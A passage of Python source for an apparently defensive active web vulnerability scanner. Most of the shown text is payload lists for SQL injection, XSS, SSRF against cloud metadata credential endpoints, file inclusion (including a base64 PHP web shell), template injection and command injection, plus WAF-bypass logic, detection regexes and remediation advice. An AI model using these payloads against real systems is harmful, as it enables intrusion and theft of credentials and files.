"""Web vulnerability scanner for the Spectre platform.

Detects the most common web application vulnerabilities:

* SQL Injection (error-based, boolean-blind, time-blind)
* Cross-Site Scripting (reflected and stored)
* Server-Side Request Forgery (SSRF)
* Local File Inclusion (LFI / wrapper abuse)
* Remote Code Execution patterns (SSTI / dynamic evaluation)
* Command Injection (output- and time-based)
* Path Traversal (dot-segment / encoding bypasses)
* Open Redirect

Design notes
------------
* Fully async, bounded by a semaphore and a wall-clock deadline so the
  scan always finishes inside the engine's per-scanner timeout.
* Both GET (query string) and POST (form body) parameters are tested.
* Parameters are discovered from the target URL and from HTML forms on
  the page; common parameter names are always appended as a fallback.
* A small payload-permutation engine provides WAF bypass variants
  (double URL encoding, keyword case mangling, ``/**/`` comments,
  tab/newline whitespace, ...). When a probe response looks like it was
  blocked by a filter, the payload is retried with those variants.
* Detection is evidence based: SQL error signatures, differential
  response lengths, response-time anomalies, raw payload reflection,
  internal-service fingerprints, template evaluation markers, etc.
"""

from __future__ import annotations

import asyncio
import base64
import re
import time
import uuid
from collections.abc import Awaitable, Callable, Sequence
from dataclasses import dataclass, field
from html.parser import HTMLParser
from urllib.parse import parse_qsl, urljoin, urlparse

import httpx
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

from ..models import Finding, Severity
from .base import BaseScanner

console = Console()

# --------------------------------------------------------------------------- #
# Constants
# --------------------------------------------------------------------------- #

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Spectre/1.0.0 SecurityScanner"

#: Domain used as the canary for open-redirect tests.
REDIRECT_MARKER = "spectre-redir.example"

#: Distinctive result of ``1234 * 5678`` - used to spot template/eval execution.
MATH_MARKER = "7006652"

#: Neutral value used for baseline (unmodified) requests.
BASELINE_VALUE = "1"

#: HTTP statuses that usually indicate a WAF / security filter.
WAF_STATUSES = {403, 406, 418, 429, 451, 999}

# --------------------------------------------------------------------------- #
# Payload libraries (20+ variations per vulnerability type)
# --------------------------------------------------------------------------- #

# --- SQL Injection ---------------------------------------------------------- #

SQLI_ERROR_PAYLOADS: tuple[str, ...] = (
    "'",
    '"',
    "\\'",
    "1'",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' #",
    "1' OR '1'='1' /*",
    "') OR ('1'='1",
    "1') OR ('1'='1' --",
    "' OR 1=1--",
    "' OR '1'='1'-- -",
    "admin'--",
    "' AND '1'='2",
    '" OR ""="',
    '" OR "1"="1',
    '1" OR "1"="1',
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "1 ORDER BY 10--",
    "1' ORDER BY 10--",
    "1; DROP TABLE spectre_test--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=CAST((SELECT version()) AS int)--",
    "'||'x",
    "1'||'1",
    "\\",
    "%27",
    "%2527",
    "0x27",
    "char(39)",
    "' OR ''='",
    "1' AND '1'='1' AND '1'='1",
    "' GROUP BY 1,2,3,4,5,6,7,8,9,10 HAVING 1=1--",
    "*'",
    "' /*",
    "1' /*",
    "-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
    "')) OR 1=1--",
    "1')) OR(('1'='1",
    "password=' OR '1'='1",
    "1; SELECT * FROM users--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
)

SQLI_BOOLEAN_PAIRS: tuple[tuple[str, str], ...] = (
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ("1 OR 1=1--", "1 OR 1=2--"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("1') OR ('1'='1'--", "1') OR ('1'='2'--"),
    ('" OR "1"="1', '" OR "1"="2'),
    ("1 AND 1=1", "1 AND 1=2"),
)

SQLI_TIME_PAYLOADS: tuple[str, ...] = (
    "' OR SLEEP(2)--",
    "1' OR SLEEP(2)--",
    "'; WAITFOR DELAY '0:0:2'--",
    "1; WAITFOR DELAY '0:0:2'--",
    "'; SELECT pg_sleep(2)--",
    "' OR pg_sleep(2)--",
    "1 AND SLEEP(2)",
    "1); SELECT pg_sleep(2)--",
)

# --- Cross-Site Scripting --------------------------------------------------- #

XSS_PAYLOADS: tuple[str, ...] = (
    "<script>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<ScRiPt>alert(1)</ScRiPt>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "</script><script>alert(1)</script>",
    "<svg><script>alert(1)</script></svg>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(1) />",
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=x onerror&#61;alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    "<img src=x onerror=alert(1)//\"",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    '"><svg onload=alert(1)>',
    "<svg onload&#61;alert(1)>",
    "<svg onload =alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    '<iframe src="javascript:alert(1)"></iframe>',
    '<a href="javascript:alert(1)">click</a>',
    "<video><source onerror=alert(1)></video>",
    "<marquee onstart=alert(1)>",
    "<div onpointerover=alert(1)>hover</div>",
    "<object data=\"javascript:alert(1)\">",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>",
    "<SCRIPT SRC=//spectre-redir.example/x.js></SCRIPT>",
    "<isindex action=javascript:alert(1) type=image>",
    "<table background=\"javascript:alert(1)\">",
    "<style>@import 'javascript:alert(1)';</style>",
    "<body background=\"javascript:alert(1)\">",
    "<form><button formaction=javascript:alert(1)>",
    "<math><brute href=\"javascript:alert(1)\">click</brute></math>",
    "<xml src=\"javascript:alert(1);\">",
    "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk=') )\">",
)

STORED_XSS_PAYLOAD_TEMPLATES: tuple[str, ...] = (
    "<script>/*{marker}*/alert(1)</script>",
    "<img src=x onerror=\"/*{marker}*/alert(1)\">",
    '"><svg/onload="/*{marker}*/alert(1)">',
    "<svg onload=alert(1) id=\"{marker}\">",
)

# --- Server-Side Request Forgery -------------------------------------------- #

SSRF_PAYLOADS: tuple[str, ...] = (
    "http://127.0.0.1",
    "http://localhost",
    "http://localhost:80",
    "http://localhost:8080",
    "http://[::1]",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://0.0.0.0",
    "http://0/",
    "http://127.1",
    "http://0x7f000001",
    "http://2130706433",
    "http://017700000001",
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://127.0.0.1:22",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:8000",
    "http://127.0.0.1:9200",
    "https://127.0.0.1",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
    "ftp://127.0.0.1/",
    "http://127.0.0.1%23@127.0.0.1",
    "http://127.0.0.1;http://127.0.0.1",
    "http://127.0.0.1.nip.io@127.0.0.1",
    "http://127.0.0.1%00.spectre-redir.example",
    "http://0177.0.0.1",
    "http://127.0.0.1:11211",
)

# --- Local File Inclusion --------------------------------------------------- #

LFI_PAYLOADS: tuple[str, ...] = (
    "/etc/passwd",
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..;/..;/..;/etc/passwd",
    "..\\..\\..\\etc\\passwd",
    "/etc/passwd%00",
    "/etc/passwd%00.png",
    "/etc/passwd%00.jpg",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
    "php://input",
    "php://fd",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
    "expect://id",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "file://localhost/etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/httpd/error_log",
    "/etc/shadow",
    "/etc/hosts",
    "C:\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "/windows/win.ini",
    "WEB-INF/web.xml",
    "/WEB-INF/web.xml",
    "..%00/etc/passwd",
    "....\\\\....\\\\etc\\\\passwd",
    "/etc/passwd?",
    "index.php%00",
    "....//....//etc/passwd%00",
    "/etc/passwd::.png",
)

# --- Remote Code Execution / SSTI ------------------------------------------- #

RCE_PAYLOADS: tuple[str, ...] = (
    "{{1234*5678}}",
    "{{ 1234 * 5678 }}",
    "${1234*5678}",
    "${{1234*5678}}",
    "<%= 1234*5678 %>",
    "#{1234*5678}",
    "@(1234*5678)",
    "{{=1234*5678}}",
    "{{1234|mul(5678)}}",
    "{{ product(1234,5678) }}",
    "{{ 7*7 }}",
    "{{config}}",
    "{{config.items()}}",
    "{{config['SECRET_KEY']}}",
    "{{self}}",
    "{{request}}",
    "{{request.application.__globals__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{cycler.__init__.__globals__}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{url_for.__globals__}}",
    "{{namespace.__init__.__globals__}}",
    "{{().__class__.__base__.__subclasses__()}}",
    "{{''.__class__.__base__.__subclasses__()}}",
    "__import__('os').popen('id').read()",
    "eval('1234*5678')",
    "exec('print(1234*5678)')",
    "eval(compile('print(1234*5678)','','exec'))",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "${Runtime.getRuntime().exec('id')}",
    "{{constructor.constructor('return 1234*5678')()}}",
    "{php}echo 1234*5678;{/php}",
    "<% print(1234*5678) %>",
    "{{['id']|map('system')|join}}",
    "{{system('id')}}",
    "{{request|attr('application')|attr('__globals__')}}",
    "${{::.exec('id')}}",
    "*{1234*5678}",
    "{{ ''.__class__.__mro__[2].__subclasses__() }}",
    "{{7*'7'}}",
    "{{ '<%- 1234*5678 %>' }}",
)

# --- Command Injection ------------------------------------------------------ #

CMDI_PAYLOADS: tuple[str, ...] = (
    ";id",
    "|id",
    "||id",
    "&&id",
    "&id",
    "`id`",
    "$(id)",
    "; id",
    "| id",
    "&& id",
    "& id",
    "\nid",
    "\n id",
    "';id;'",
    '";id;"',
    ' | id "',
    "'; id; echo '",
    "'; id #",
    "& whoami",
    "| whoami",
    "&& whoami",
    "`whoami`",
    "$(whoami)",
    "&& dir",
    "& dir",
    "| dir",
    "& type C:\\windows\\win.ini",
    "| type C:\\windows\\win.ini",
    "; type C:\\windows\\win.ini",
    "| cat /etc/passwd",
    "; cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "|| cat /etc/passwd #",
    "%0aid",
    "%0a id",
    "%0a%0did",
    "| ping -c 2 127.0.0.1",
    "; ping -n 3 127.0.0.1",
    "|| ping -c 2 127.0.0.1 #",
    "`ping -c 2 127.0.0.1`",
    "1;id",
    "1|id",
    "1&&id",
    "1 | id",
    "' | id '",
    "\");id;//",
    "|(id)",
    ";id #",
    "& ipconfig",
    "| ipconfig",
    "%0d%0aid",
)

CMDI_TIME_PAYLOADS: tuple[str, ...] = (
    "; sleep 2",
    "| sleep 2",
    "|| sleep 2 #",
    "&& sleep 2",
    "`sleep 2`",
    "$(sleep 2)",
    "'; sleep 2;'",
    "';sleep 2--",
    "| ping -c 4 127.0.0.1",
    "; ping -n 5 127.0.0.1",
    "& ping -n 5 127.0.0.1",
    "%0a sleep 2",
)

# --- Path Traversal --------------------------------------------------------- #

TRAVERSAL_PAYLOADS: tuple[str, ...] = (
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../",
    "../../../../../../../",
    "../../../../../../../../",
    "..\\",
    "..\\..\\",
    "..\\..\\..\\",
    "..%2f",
    "..%2f..%2f",
    "..%2f..%2f..%2f",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%252f",
    "%252e%252e%252f",
    "....//",
    "....\\\\",
    "..;/",
    "..%00/",
    "..%c0%af",
    "..%c1%9c",
    "..%e0%80%af",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..././..././..././etc/passwd",
    "..%2f..%2fetc%2fpasswd%00",
    "file:///etc/passwd",
    "/etc/passwd",
    "etc/passwd",
    "..%5c..%5c..%5cwindows%5cwin.ini%00",
    "....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fshadow",
    "..%5c..%5cboot.ini",
    "%2e%2e%5c%2e%2e%5cboot.ini",
    "..%2ftmp%2f",
    "..%2fapp%2f",
)

# --- Open Redirect ---------------------------------------------------------- #

REDIRECT_PAYLOADS: tuple[str, ...] = (
    f"https://{REDIRECT_MARKER}",
    f"https://{REDIRECT_MARKER}/",
    f"http://{REDIRECT_MARKER}",
    f"//{REDIRECT_MARKER}",
    f"///{REDIRECT_MARKER}",
    f"\\/\\/{REDIRECT_MARKER}",
    f"/\\{REDIRECT_MARKER}",
    f"https:/\\{REDIRECT_MARKER}",
    f"%2f%2f{REDIRECT_MARKER}",
    f"https:%2f%2f{REDIRECT_MARKER}",
    f"//{REDIRECT_MARKER}%2f@trusted.example",
    f"//user@{REDIRECT_MARKER}",
    f"//{REDIRECT_MARKER}\\",
    f"https:\\{REDIRECT_MARKER}",
    f"////{REDIRECT_MARKER}",
    f"//{REDIRECT_MARKER}?",
    f"//{REDIRECT_MARKER}#",
    f"//{REDIRECT_MARKER}/../",
    f"///\\///{REDIRECT_MARKER}",
    f"\t//{REDIRECT_MARKER}",
    f" // {REDIRECT_MARKER}",
    f"https://{REDIRECT_MARKER}%00.trusted.example",
    f"//{REDIRECT_MARKER}.trusted.example",
    f"https://{REDIRECT_MARKER}.trusted.example",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    f"//127.0.0.1:{4321}//{REDIRECT_MARKER}",
)

# --------------------------------------------------------------------------- #
# Detection signatures
# --------------------------------------------------------------------------- #

SQL_ERROR_PATTERNS: tuple[str, ...] = (
    r"you have an error in your sql syntax",
    r"warning.{0,80}mysql_",
    r"mysql_(query|fetch|connect)",
    r"mysqli?_(query|fetch_array|error)",
    r"SQL syntax.{0,100}mysql",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB)",
    r"MySQLSyntaxErrorException",
    r"SQLSTATE\[HY000\]",
    r"SQLSTATE\[42000\]",
    r"SQLSTATE\[22001\]",
    r"supplied argument is not a valid MySQL",
    r"PostgreSQL.{0,40}ERROR",
    r"WARNING:\s*pg_",
    r"unterminated quoted string at or near",
    r"PG::(SyntaxError|Error)",
    r"org\.postgresql\.util\.PSQLException",
    r"pg_query\(\)",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"\[SQLITE_ERROR\]",
    r"SQLite error\b",
    r"warning.{0,40}sqlite3_",
    r"PDO(_Statement)?::{0,2}(execute|query)",
    r"PDOException",
    r"Microsoft OLE DB Provider for (SQL Server|ODBC)",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver",
    r"\[SQL Server\]",
    r"Unclosed quotation mark after the character string",
    r"Microsoft JET Database Engine",
    r"ORA-\d{5}",
    r"Oracle error",
    r"quoted string not properly terminated",
    r"OCIStmtExecute",
    r"syntax error at or near",
    r"Unexpected end of command",
    r"Division by zero",
    r"XPATH syntax error",
    r"Duplicate entry '[^']*' for key",
    r"com\.mysql\.jdbc\.exceptions",
    r"SQL command not properly ended",
    r"java\.sql\.SQLException",
    r"System\.Data\.SqlClient\.SqlException",
    r"Incorrect syntax near",
    r"ParserError",
    r"StatementImpl",
)

SSRF_SIGNATURES: tuple[str, ...] = (
    r"ami-[0-9a-f]{8,17}",
    r"instance-id",
    r"latest/meta-data",
    r"iam/security-credentials",
    r"computeMetadata",
    r"metadata\.google\.internal",
    r"X-Azure-Instance",
    r"root:x:0:0:",
    r"unix:x:0:0:",
    r"redis_version:",
    r"-MOVED \d+",
    r"SSH-2\.0-OpenSSH",
    r"220[\s-].*FTP server ready",
    r"220[\s-].*ProFTPD",
    r"RFB003\.\d{3}",
    r"<title>IIS Windows Server",
    r"<title>Welcome to nginx</title>",
    r"<title>Apache Tomcat",
    r"Elasticsearch",
    r"<title>Index of /",
    r"MQTT Protocol",
    r"JBoss EAP",
    r"WebLogic Server",
    r"phpMyAdmin",
    r"Adminer",
)

FILE_SIGNATURES: tuple[str, ...] = (
    r"root:x:0:0:",
    r"root:x:0:0:/root",
    r"\nroot:x:\d+",
    r"daemon:x:\d+",
    r"bin:x:\d+",
    r"unix:x:0:0:",
    r"nobody:x:\d+",
    r"/bin/(ba)?sh",
    r"for 16-bit app support",
    r"\[fonts\]",
    r"\[extensions\]",
    r"\[files\]",
    r"\[Mail\]",
    r"\[mci extensions\]",
    r"^\[boot loader\]",
    r"^\[operating systems\]",
    r"^\[fonts\]",
    r"Microsoft (R) Windows",
)

CMD_OUTPUT_SIGNATURES: tuple[str, ...] = (
    r"uid=\d+:\d+:[^ \n]+",
    r"uid=\d+:\d+:",
    r"gid=\d+:\d+:",
    r"groups=\d+:",
    r"Directory of [A-Za-z]:\\",
    r"Volume in drive [A-Z] is",
    r"Volume serial number is",
    r"\r\n\r\n.*\[boot loader\]",
)

WAF_SIGNATURES: tuple[str, ...] = (
    r"access denied",
    r"request rejected",
    r"mod_?security",
    r"modsecurity",
    r"you have been blocked",
    r"attention required",
    r"cloudflare ray id",
    r"incapsula incident",
    r"imperva",
    r"akamai",
    r"sucuri webSiteFirewall",
    r"wordfence",
    r"the request could not be satisfied",
    r"various security reasons",
    r"not acceptable",
    r"reference #",
    r"WAF blocked",
    r"blocked by security",
)

RCE_DUMP_PATTERNS: tuple[str, ...] = (
    MATH_MARKER,
    r"<class 'str'>",
    r"<class 'type'>",
    r"jinja2\.(environment|runtime|filters)",
    r"Markup\(.*jinja2",
    r"'SECRET_KEY':",
    r"__main__\.__globals__",
    r"Popen\(.*id",
)

PARAM_HINTS: dict[str, tuple[str, ...]] = {
    "sqli": (
        "id", "uid", "user", "user_id", "item", "product", "order", "cat",
        "category", "news", "article", "select", "query", "page_id", "filter",
        "sort", "by", "search", "q", "name", "item_id", "pid", "sid",
    ),
    "xss": (
        "q", "search", "name", "comment", "message", "title", "text",
        "input", "query", "term", "desc", "description", "body", "note",
        "feedback", "email", "subject",
    ),
    "ssrf": (
        "url", "uri", "link", "src", "source", "dest", "fetch", "proxy",
        "api", "feed", "host", "domain", "ip", "webhook", "endpoint",
        "callback", "image", "img", "path", "site",
    ),
    "lfi": (
        "file", "filename", "path", "page", "include", "doc", "document",
        "folder", "dir", "template", "view", "load", "read", "site",
        "lang", "layout", "mod", "conf", "config", "resource", "download",
    ),
    "traversal": (
        "file", "path", "page", "dir", "folder", "doc", "template",
        "download", "image", "img", "src", "resource", "name", "docid",
    ),
    "rce": (
        "cmd", "command", "exec", "eval", "code", "template", "query",
        "expr", "input", "data", "payload", "ping", "ip", "host", "run",
        "shell", "debug", "name", "tpl", "expr",
    ),
    "cmdi": (
        "cmd", "command", "exec", "ping", "ip", "host", "name", "query",
        "run", "shell", "dir", "target", "url", "server", "addr",
    ),
    "redirect": (
        "url", "uri", "redirect", "redirect_uri", "redirect_url", "next",
        "return", "returnurl", "return_url", "return_to", "goto", "dest",
        "destination", "target", "link", "continue", "redir", "r", "u",
        "callback", "state", "site", "checkout_url", "back", "forward",
        "to", "from", "ref", "referer", "website", "out", "success",
        "failure", "cancel", "jump", "window", "view", "redirecturi",
    ),
    "stored": (
        "comment", "message", "message_body", "body", "note", "feedback",
        "review", "bio", "about", "title", "content", "text", "name",
    ),
}

COMMON_PARAMS: tuple[str, ...] = (
    "id", "q", "search", "query", "page", "name", "value", "data", "input",
    "url", "redirect", "next", "return", "file", "path", "cmd", "template",
    "callback", "view", "host", "comment", "message", "target", "dest",
)

REMEDIATIONS: dict[str, str] = {
    "sqli": (
        "Use parameterized queries / prepared statements for all database "
        "access; apply strict input validation and allow-lists; run the "
        "database account with least privilege; enable generic error pages."
    ),
    "xss_reflected": (
        "Apply context-aware output encoding (HTML/JS/URL/attribute) on "
        "every reflection point; deploy a Content-Security-Policy; sanitize "
        "input with an allow-list of safe markup."
    ),
    "xss_stored": (
        "Sanitize and encode user content both on storage and on output; "
        "serve user-generated HTML from a sandboxed origin; enforce a strict "
        "Content-Security-Policy."
    ),
    "ssrf": (
        "Allow-list outbound request destinations; block loopback, "
        "link-local and cloud-metadata ranges; disable unused URL schemes "
        "(gopher/dict/file); enforce DNS resolution checks and egress "
        "firewalling."
    ),
    "lfi": (
        "Never build file paths from user input; map parameters to fixed "
        "identifiers; canonicalize paths and verify they stay inside the "
        "intended directory; disable dangerous wrappers; run the app with "
        "minimal filesystem privileges."
    ),
    "rce": (
        "Never pass user input to eval/exec/template rendering with "
        "code execution enabled; sandbox template engines (no globals/"
        "builtins); allow-list expressions; disable dangerous template "
        "features."
    ),
    "cmdi": (
        "Avoid shelling out with user-controlled data; use argument arrays "
        "instead of shell strings; validate input against a strict "
        "allow-list; drop OS privileges for child processes."
    ),
    "traversal": (
        "Canonicalize and resolve paths, then verify they remain within the "
        "document root before access; reject '..' segments, encoded "
        "separators and null bytes; use indirect object references."
    ),
    "redirect": (
        "Only redirect to an allow-list of local paths or known domains; "
        "reject absolute/user-controlled URLs and protocol-relative "
        "values; prefer relative redirects."
    ),
    "waf": (
        "Keep the WAF in blocking mode, tune rules to avoid false "
        "negatives, and monitor logs for repeated probe traffic."
    ),
}

# --------------------------------------------------------------------------- #
# Helpers / data structures
# --------------------------------------------------------------------------- #


@dataclass
class InjectionPoint:
    """A single (method, url, parameter) triple to attack."""

    method: str  # "GET" or "POST"
    url: str
    param: str
    base_data: dict[str, str] = field(default_factory=dict)
    source: str = "form"  # "query" | "form" | "common"

    @property
    def key(self) -> tuple[str, str, str]:
        """Identity used for de-duplication and baseline caching."""
        return (self.method, self.url, self.param)


class _FormParser(HTMLParser):
    """Extract ``<form>`` elements (action, method, named fields)."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.forms: list[dict] = []
        self._current: dict | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attrs_d = {k: (v or "") for k, v in attrs}
        tag = tag.lower()
        if tag == "form":
            self._current = {
                "action": attrs_d.get("action", ""),
                "method": (attrs_d.get("method") or "get").upper(),
                "fields": {},
            }
            self.forms.append(self._current)
        elif tag in ("input", "textarea", "select") and self._current is not None:
            name = attrs_d.get("name")
            if not name:
                return
            input_type = attrs_d.get("type", "text").lower()
            if tag == "input" and input_type in ("submit", "button", "reset", "image", "file"):
                return
            if tag == "input" and input_type == "checkbox" and "checked" not in attrs_d:
                return
            value = attrs_d.get("value") or ("1" if input_type != "hidden" else "")
            if input_type == "hidden" and not value:
                value = "1"
            self._current["fields"].setdefault(name, value or "1")

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form":
            self._current = None


def _compile(patterns: Sequence[str]) -> tuple[re.Pattern[str], ...]:
    return tuple(re.compile(p, re.IGNORECASE | re.DOTALL) for p in patterns)


_SQL_ERROR_RE = _compile(SQL_ERROR_PATTERNS)
_SSRF_SIG_RE = _compile(SSRF_SIGNATURES)
_FILE_SIG_RE = _compile(FILE_SIGNATURES)
_CMD_SIG_RE = _compile(CMD_OUTPUT_SIGNATURES)
_WAF_SIG_RE = _compile(WAF_SIGNATURES)
_RCE_DUMP_RE = _compile(RCE_DUMP_PATTERNS)

_SQL_KEYWORDS = (
    "SELECT", "FROM", "WHERE", "UNION", "INSERT", "UPDATE", "DELETE",
    "SLEEP", "WAITFOR", "DELAY", "TABLE", "DROP", "ORDER", "GROUP",
    "HAVING", "CONCAT", "EXTRACTVALUE", "UPDATEXML", "CONVERT", "CAST",
    "INFORMATION_SCHEMA", "COUNT", "VERSION", "pg_sleep",
)

# --------------------------------------------------------------------------- #
# Scanner
# --------------------------------------------------------------------------- #


class WebScanner(BaseScanner):
    """Active web application vulnerability scanner."""

    name = "web"
    description = "Web vulnerability scanner (SQLi, XSS, SSRF, LFI, RCE, CMDi, traversal, open redirect)"
    version = "1.0.0"

    #: Wall-clock budget for the whole scan (engine timeout is 30s).
    SCAN_DEADLINE = 24.0
    #: Per-request timeout.
    REQUEST_TIMEOUT = httpx.Timeout(5.0, connect=3.0)
    #: Global in-flight request cap.
    MAX_CONCURRENT = 16
    #: Payloads sent per concurrent batch (early exit between batches).
    CHUNK = 8
    #: Maximum injection points attacked per vulnerability type.
    MAX_POINTS_PER_TEST = 6
    #: Hard cap on total requests issued by one scan.
    MAX_REQUESTS = 1500
    #: Delay used by time-based payloads (seconds).
    TIME_SLEEP = 2.0

    # ------------------------------------------------------------------ #
    # Entry point
    # ------------------------------------------------------------------ #

    async def scan(self, target: str) -> list[Finding]:
        """Scan *target* for web vulnerabilities and return findings."""
        target = self._normalize_target(target)
        self._init_state()

        findings: list[Finding] = []
        headers = {"User-Agent": USER_AGENT, "Accept": "*/*"}

        try:
            async with httpx.AsyncClient(
                timeout=self.REQUEST_TIMEOUT,
                follow_redirects=True,
                headers=headers,
            ) as client, httpx.AsyncClient(
                timeout=self.REQUEST_TIMEOUT,
                follow_redirects=False,
                headers=headers,
            ) as raw_client:
                points = await self._discover(client, target)
                if not points:
                    points = self._fallback_points(target)
                points = self._dedupe(points)

                tests: list[tuple[str, Callable[[], Awaitable[list[Finding]]]]] = [
                    ("SQL injection", lambda: self._test_sqli(client, points)),
                    ("Remote code execution", lambda: self._test_rce(client, points)),
                    ("Command injection", lambda: self._test_cmdi(client, points)),
                    ("SSRF", lambda: self._test_ssrf(client, points)),
                    ("Local file inclusion", lambda: self._test_lfi(client, points)),
                    ("Path traversal", lambda: self._test_traversal(client, points)),
                    ("Reflected XSS", lambda: self._test_xss(client, points)),
                    ("Stored XSS", lambda: self._test_stored_xss(client, points)),
                    ("Open redirect", lambda: self._test_open_redirect(raw_client, points)),
                ]

                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    console=console,
                    transient=True,
                ) as progress:
                    for label, factory in tests:
                        if self._past_deadline():
                            task = progress.add_task(f"[yellow]{label}: skipped (time budget)[/yellow]", total=None)
                            progress.update(task, description=f"[yellow]⏭ {label} (deadline reached)[/yellow]")
                            break
                        task = progress.add_task(f"Testing {label}...", total=None)
                        try:
                            batch = await factory()
                            findings.extend(batch)
                            progress.update(
                                task,
                                description=f"[green]✓ {label}[/green] ({len(batch)} finding(s))",
                            )
                        except asyncio.CancelledError:
                            raise
                        except Exception as exc:  # keep scanning other test types
                            progress.update(
                                task,
                                description=f"[red]✗ {label}: {type(exc).__name__}: {exc}[/red]",
                            )
        except httpx.HTTPError as exc:
            console.print(f"[red]web scanner: transport error while scanning {target}: {exc}[/red]")
            return findings
        except Exception as exc:
            console.print(f"[red]web scanner: {type(exc).__name__}: {exc}[/red]")
            return findings

        if self._waf_evidence:
            findings.append(
                Finding(
                    title="Web application firewall / security filter detected",
                    severity=Severity.INFO,
                    target=target,
                    evidence=self._waf_evidence,
                    remediation=REMEDIATIONS["waf"],
                    scanner=self.name,
                    verified=True,
                    metadata={"vuln_type": "waf"},
                )
            )

        return findings

    # ------------------------------------------------------------------ #
    # Per-scan state
    # ------------------------------------------------------------------ #

    def _init_state(self) -> None:
        self._start = time.monotonic()
        self._deadline = self._start + self.SCAN_DEADLINE
        self._sem = asyncio.Semaphore(self.MAX_CONCURRENT)
        self._requests = 0
        self._baselines: dict[tuple[str, str, str], httpx.Response | None] = {}
        self._baseline_times: dict[tuple[str, str, str], float] = {}
        self._waf_count = 0
        self._waf_evidence = ""

    # ------------------------------------------------------------------ #
    # Small utilities
    # ------------------------------------------------------------------ #

    @staticmethod
    def _normalize_target(target: str) -> str:
        target = (target or "").strip()
        if not target:
            raise ValueError("empty scan target")
        if not re.match(r"^https?://", target, re.IGNORECASE):
            target = "http://" + target
        parsed = urlparse(target)
        if not parsed.netloc:
            raise ValueError(f"invalid scan target: {target!r}")
        return target.split("#", 1)[0]

    def _remaining(self) -> float:
        return self._deadline - time.monotonic()

    def _past_deadline(self) -> bool:
        return self._remaining() <= 0 or self._requests >= self.MAX_REQUESTS

    @staticmethod
